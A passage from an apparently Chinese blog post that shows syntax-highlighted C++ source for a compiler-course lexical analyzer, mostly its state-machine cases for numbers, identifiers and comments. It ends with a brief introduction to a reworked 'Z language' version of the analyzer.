class="keyword">case</span> <span class="number">16</span>:&#123;   <span class="comment">// 双引号 条件终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;&quot;&#x27;</span>)&#123;  <span class="comment">// 字符常量</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            <span class="built_in">typeConst</span>(<span class="number">2</span>);</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="built_in">newStatus</span>(<span class="number">16</span>);       <span class="comment">// 原地踏步</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">17</span>:&#123;   <span class="comment">// 标识符 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>() || <span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>() || wd == <span class="string">&#x27;_&#x27;</span>)   <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">17</span>);</span><br><span class="line">                        <span class="keyword">else</span> &#123;    <span class="comment">// 获取标识符</span></span><br><span class="line">                            <span class="built_in">typeWords</span>(<span class="number">1</span>);</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">18</span>:&#123;   <span class="comment">// 真 实数 后可不跟数字 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>()) <span class="built_in">newStatus</span>(<span class="number">18</span>);   <span class="comment">// 原地踏步</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>)     <span class="comment">// 状态转移-&gt;19 科学计数法  允许有: 3.e7 的写法</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        <span class="keyword">else</span> &#123;    <span class="comment">// 截取实数</span></span><br><span class="line">                            <span class="built_in">typeConst</span>(<span class="number">1</span>);</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; </span><br><span class="line">                    <span class="keyword">case</span> <span class="number">19</span>:&#123;   <span class="comment">// 科学计数法e 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;+&#x27;</span> || wd == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">25</span>);       <span class="comment">// 状态转移-&gt;25 科学计数法+-</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>()) <span class="built_in">newStatus</span>(<span class="number">26</span>);      <span class="comment">// 状态转移-&gt;26 十进制整数后终态</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="built_in">passError</span>();      <span class="comment">// 出错啦</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">20</span>:&#123;   <span class="comment">// 十六进制x 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">16</span>)) <span class="built_in">newStatus</span>(<span class="number">27</span>);     <span class="comment">// 状态转移-&gt;27 十六进制整数后终态</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="built_in">passError</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">21</span>:&#123;   <span class="comment">// 二进制数b 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">2</span>)) <span class="built_in">newStatus</span>(<span class="number">28</span>);      <span class="comment">// 状态转移-&gt;28 二进制数后终态</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="built_in">passError</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">22</span>:&#123;   <span class="comment">// 八进制数中态 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">8</span>)) <span class="built_in">newStatus</span>(<span class="number">22</span>);      <span class="comment">// 原地踏步</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">19</span>);      <span class="comment">// 状态转移-&gt;19 科学计数法e</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;.&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">18</span>);   <span class="comment">// 状态转移-&gt;18 当做十进制数处理的八进制小数(C++中自适应)</span></span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="built_in">typeConst</span>(<span class="number">0</span>);</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">23</span>:&#123;   <span class="comment">// 单行注释符// 条件终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;\n&#x27;</span>)&#123;   <span class="comment">// 截取单行注释串</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            <span class="built_in">typeNote</span>();</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="built_in">newStatus</span>(<span class="number">23</span>);    <span class="comment">// 原地踏步</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">24</span>:&#123;   <span class="comment">// 多行注释符/* 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;*&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">29</span>);    <span class="comment">// 状态转移-&gt;29 检测退出记号*/</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="built_in">newStatus</span>(<span class="number">24</span>);    <span class="comment">// 原地踏步</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">25</span>:&#123;   <span class="comment">// 科学计数法+- 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>()) <span class="built_in">newStatus</span>(<span class="number">26</span>);       <span class="comment">// 状态转移-&gt;26 十进制整数后终态</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="built_in">passError</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">26</span>:&#123;   <span class="comment">// 十进制整数后终态 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>()) <span class="built_in">newStatus</span>(<span class="number">26</span>);       <span class="comment">// 原地踏步</span></span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="built_in">typeConst</span>(<span class="number">1</span>);</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">27</span>:&#123;   <span class="comment">// 十六进制整数后终态 十六进制不接受小数点</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">16</span>)) <span class="built_in">newStatus</span>(<span class="number">27</span>);     <span class="comment">// 原地踏步</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">19</span>);      <span class="comment">// 状态转移-&gt;19</span></span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="built_in">typeConst</span>(<span class="number">0</span>);</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">28</span>:&#123;   <span class="comment">// 二进制数后终态</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">2</span>)) <span class="built_in">newStatus</span>(<span class="number">28</span>);</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="built_in">typeConst</span>(<span class="number">0</span>);</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">29</span>:&#123;   <span class="comment">// 检测退出记号 */</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);  </span><br><span class="line">                            <span class="built_in">typeNote</span>();</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;*&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">29</span>);     <span class="comment">// 原地踏步</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="built_in">newStatus</span>(<span class="number">24</span>);    <span class="comment">// 状态转移-&gt;24</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(needOF)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;==&gt; The output has been saved to the file: %s&quot;</span>, oFP.<span class="built_in">c_str</span>());   <span class="comment">// 保存文件</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">blankContinue</span><span class="params">()</span></span>&#123;    <span class="comment">// 跳过空白字符，考虑换行对正负加减的影响</span></span><br><span class="line">            <span class="keyword">if</span>(wd == <span class="string">&#x27;\n&#x27;</span>) cag = <span class="number">3</span>;     <span class="comment">// 对于大部分词元而言换行等价于界符 </span></span><br><span class="line">            p += <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">passError</span><span class="params">()</span></span>&#123;   <span class="comment">// 跳过错误部分，不考虑错误部分引号的性质</span></span><br><span class="line">            <span class="keyword">while</span>(p &lt; srcLen)&#123;</span><br><span class="line">                wd = src[p];</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isDelimiter</span>() || <span class="built_in">isBlank</span>() || wd == <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                    <span class="built_in">outError</span>();</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(wd == <span class="string">&#x27;:&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(src[p+<span class="number">1</span>]!=<span class="string">&#x27;=&#x27;</span>)&#123;</span><br><span class="line">                        <span class="built_in">outError</span>();</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(wd == <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(src[p+<span class="number">1</span>]==<span class="string">&#x27;/&#x27;</span> || src[p+<span class="number">1</span>]==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                        <span class="built_in">outError</span>();</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">newStatus</span>(<span class="number">-1</span>);  <span class="comment">// 避免分界符被放入错误输出中</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;   <span class="comment">// error?</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">outError</span><span class="params">()</span></span>&#123;     <span class="comment">// 错误报告</span></span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;Error with: %s\n&quot;</span>, words.<span class="built_in">c_str</span>());</span><br><span class="line">            <span class="built_in">newStatus</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">newStatus</span><span class="params">(<span class="type">int</span> _s)</span></span>&#123;  <span class="comment">// 更新状态, 不初始化则迭代指针</span></span><br><span class="line">            <span class="keyword">switch</span>(_s)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:    <span class="comment">// 为0则初始化状态</span></span><br><span class="line">                    status = <span class="number">0</span>;    <span class="comment">// 原始状态</span></span><br><span class="line">                    len = <span class="number">0</span>;</span><br><span class="line">                    words = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">-1</span>:   <span class="comment">// -1作为一个暂态，处理不需要状态实际转移的情况</span></span><br><span class="line">                    len += <span class="number">1</span>;</span><br><span class="line">                    words += wd;</span><br><span class="line">                    p += <span class="number">1</span>;     <span class="comment">// 迭代指针</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:    <span class="comment">// 不为0就更新状态</span></span><br><span class="line">                    status = _s;</span><br><span class="line">                    len += <span class="number">1</span>;</span><br><span class="line">                    words += wd;</span><br><span class="line">                    p += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">output</span><span class="params">()</span></span>&#123;   <span class="comment">// 存储词元、输出、初始化</span></span><br><span class="line">            <span class="keyword">switch</span>(type)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">break</span>;      <span class="comment">// 关键字</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:    <span class="comment">// 运算符</span></span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">20</span>; i&lt;<span class="number">33</span>; i++)</span><br><span class="line">                        <span class="keyword">if</span>(wordsTable[i] == words)&#123;</span><br><span class="line">                            cag = i+<span class="number">1</span>;</span><br><span class="line">                            <span class="keyword">break</span>;  <span class="comment">// 跳出for循环而非case</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">// 出错啦</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: <span class="keyword">break</span>;      <span class="comment">// 常数</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:    <span class="comment">// 界符</span></span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">38</span>; i&lt;<span class="number">49</span>; i++)</span><br><span class="line">                        <span class="keyword">if</span>(wordsTable[i] == words)&#123;</span><br><span class="line">                            cag = i+<span class="number">1</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">// 出错啦</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>:    <span class="comment">// 标识符</span></span><br><span class="line">                    cag = <span class="number">34</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5</span>:     <span class="comment">// 注释 无需输出与存储，初始化后退出</span></span><br><span class="line">                    <span class="built_in">newStatus</span>(<span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            wordsLen += <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;(%d)(%d,%s)\n&quot;</span>, wordsLen, cag, words.<span class="built_in">c_str</span>());</span><br><span class="line">            strV.<span class="built_in">push_back</span>(words);   <span class="comment">// 存储词元</span></span><br><span class="line">            typeV.<span class="built_in">push_back</span>(cag);   <span class="comment">// 存储词元</span></span><br><span class="line">            <span class="built_in">newStatus</span>(<span class="number">0</span>);   <span class="comment">// 初始化</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">typeWords</span><span class="params">(<span class="type">int</span> n = <span class="number">0</span>)</span></span>&#123;    <span class="comment">// 确定全字母词元 关键字 || 标识符 || 布尔常量</span></span><br><span class="line">            <span class="keyword">if</span>(!n)&#123;</span><br><span class="line">                cag = <span class="built_in">isKeywords</span>();</span><br><span class="line">                <span class="keyword">if</span>(cag) type = <span class="number">0</span>;   <span class="comment">// 是关键字</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isBoolean</span>())&#123;   <span class="comment">// 布尔常量</span></span><br><span class="line">                    type = <span class="number">2</span>;</span><br><span class="line">                    cag = <span class="number">38</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> type = <span class="number">4</span>;    <span class="comment">// 标识符</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 标识符</span></span><br><span class="line">                type = <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">typeOperator</span><span class="params">()</span></span>&#123;    <span class="comment">// 确定运算符</span></span><br><span class="line">            type = <span class="number">1</span>;   <span class="comment">// 常量</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">typeConst</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;    <span class="comment">// 确定常量, 0-&gt;整型 1-&gt;实数 2-&gt;字符串 3-&gt;布尔</span></span><br><span class="line">            type = <span class="number">2</span>;   <span class="comment">// 常量</span></span><br><span class="line">            <span class="keyword">switch</span>(n)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    cag = <span class="number">35</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    cag = <span class="number">36</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    cag = <span class="number">37</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                    cag = <span class="number">38</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">typeDelimiter</span><span class="params">()</span></span>&#123;    <span class="comment">// 确定界符</span></span><br><span class="line">            type = <span class="number">4</span>;   <span class="comment">// 常量</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">typeNote</span><span class="params">()</span></span>&#123;    <span class="comment">// 确定注释</span></span><br><span class="line">            type = <span class="number">5</span>;   <span class="comment">// 常量</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">isBlank</span><span class="params">()</span><span class="type">const</span></span>&#123;    <span class="comment">// 检测空白字符</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">                <span class="keyword">if</span>(filt[i] == wd) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">isDelimiter</span><span class="params">()</span><span class="type">const</span></span>&#123;    <span class="comment">// 判断是否是单字分界符</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">                <span class="keyword">if</span>(wd == delm[i]) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">isBoolean</span><span class="params">()</span><span class="type">const</span></span>&#123;   <span class="comment">// 判断布尔常量</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">2</span>; i++)</span><br><span class="line">                <span class="keyword">if</span>(words == boolean[i]) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">isKeywords</span><span class="params">()</span><span class="type">const</span></span>&#123;  <span class="comment">// 判断关键字，返回种别码或0</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;keyWordsLen; i++)</span><br><span class="line">                <span class="keyword">if</span>(words == wordsTable[i]) <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isNumber</span><span class="params">(<span class="type">int</span> lim = <span class="number">10</span>)</span><span class="type">const</span></span>&#123;  <span class="comment">// 判断数字</span></span><br><span class="line">            <span class="keyword">switch</span> (lim)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:    <span class="comment">// 除0以外的十进制数字</span></span><br><span class="line">                    <span class="keyword">if</span>(wd &gt;= <span class="string">&#x27;1&#x27;</span> &amp;&amp; wd &lt;= <span class="string">&#x27;9&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">10</span>:        <span class="comment">// 十进制</span></span><br><span class="line">                    <span class="keyword">if</span>(wd&gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; wd&lt;=<span class="string">&#x27;9&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                    <span class="keyword">if</span>(wd &gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; wd&lt;=<span class="string">&#x27;7&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    <span class="keyword">if</span>(wd &gt;=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">                    <span class="keyword">if</span>(wd &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; wd &lt;= <span class="string">&#x27;9&#x27;</span> || wd &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; wd &lt;= <span class="string">&#x27;f&#x27;</span> || wd &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; wd &lt;= <span class="string">&#x27;F&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isLowerLetter</span><span class="params">()</span><span class="type">const</span></span>&#123;  <span class="comment">// 判断大写字母</span></span><br><span class="line">            <span class="keyword">if</span>(wd&gt;=<span class="string">&#x27;a&#x27;</span> &amp;&amp; wd&lt;=<span class="string">&#x27;z&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isUpperLetter</span><span class="params">()</span><span class="type">const</span></span>&#123;  <span class="comment">// 判断大写字母</span></span><br><span class="line">            <span class="keyword">if</span>(wd&gt;=<span class="string">&#x27;A&#x27;</span> &amp;&amp; wd&lt;=<span class="string">&#x27;Z&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">printSplit</span><span class="params">(string text)</span></span>&#123;  <span class="comment">// 输出夹带文本的分割线</span></span><br><span class="line">            <span class="type">const</span> <span class="type">int</span> aLen = <span class="number">60</span>;</span><br><span class="line">            <span class="type">int</span> _len = text.<span class="built_in">length</span>()+<span class="number">2</span>; <span class="comment">// 两侧留空</span></span><br><span class="line">            <span class="type">int</span> left = (aLen-_len)/<span class="number">2</span>, right = aLen - left - _len;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;left; i++) <span class="built_in">newPrintf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot; %s &quot;</span>, text.<span class="built_in">c_str</span>());</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;right; i++) <span class="built_in">newPrintf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">newPrintf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span>&#123;   <span class="comment">// 重载自己的printf, 便于保存输出的内容, 参考: https://blog.csdn.net/weixin_51281362/article/details/125445742 | https://blog.csdn.net/wanruiou/article/details/115180466</span></span><br><span class="line">            va_list arg;    </span><br><span class="line">            <span class="built_in">va_start</span>(arg, fmt); <span class="comment">// 传入地址</span></span><br><span class="line">            <span class="built_in">vprintf</span>(fmt, arg); </span><br><span class="line">            <span class="keyword">if</span>(needOF)  <span class="comment">// 需要保存至文件</span></span><br><span class="line">                <span class="built_in">vfprintf</span>(oF, fmt, arg); <span class="comment">// 借助FILE将printf重定向至文件流, 参考: https://blog.csdn.net/LuyaoYing001/article/details/79750833</span></span><br><span class="line">            <span class="built_in">va_end</span>(arg);    <span class="comment">// 结束可变参数的获取</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    wordsAnalyzer *wA = <span class="keyword">new</span> <span class="built_in">wordsAnalyzer</span>();</span><br><span class="line">    wA-&gt;<span class="built_in">printSplit</span>(<span class="string">&quot;Lexical Analysis&quot;</span>);</span><br><span class="line">    wA-&gt;<span class="built_in">analyze</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Z语言版本"><a href="#Z语言版本" class="headerlink" title="Z语言版本"></a>Z语言版本</h3><p>鉴于编译原理老师神奇的吃表操作，而且新的表甚至抛弃了布尔常量和字符串，特地改了一份符合新词元表的词法分析器，总体与上一个版本是一样的。为了后续维护的方便，没有做高度的封装，将一些功能开放出来。</p>
<p>源码：</p>
